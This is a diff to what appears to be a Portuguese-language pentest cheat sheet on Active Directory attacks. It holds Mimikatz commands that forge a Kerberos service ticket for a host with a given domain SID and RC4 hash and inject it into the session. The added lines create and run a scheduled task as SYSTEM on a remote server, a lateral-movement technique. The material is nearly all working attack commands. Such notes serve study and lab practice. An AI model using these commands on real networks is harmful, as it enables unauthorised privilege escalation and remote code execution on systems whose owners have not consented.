@@ -1381,10 +1381,13 @@ dir \\server01.tech.local\c$
 kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:host /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
 kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01 /service:host /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
 ```
+CRIAR TAREFA AGENDADA
 ```
-schtasks /create /S server01.tech.local  /SC weekly /RU "NT Authority\System" /TN "STCheck" /TR "whoami > c:\eu.txt"
-
-schtasks /Run /S server01.tech.local 
+schtasks /create /S server02 /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "STCHECK" /TR "cmd /c whoami > c:\eu.txt"
+```
+RODAR TAREFA AGENDADA
+```
+schtasks /RUN /S server02 /TN "STCHECK"
 ```
 
 
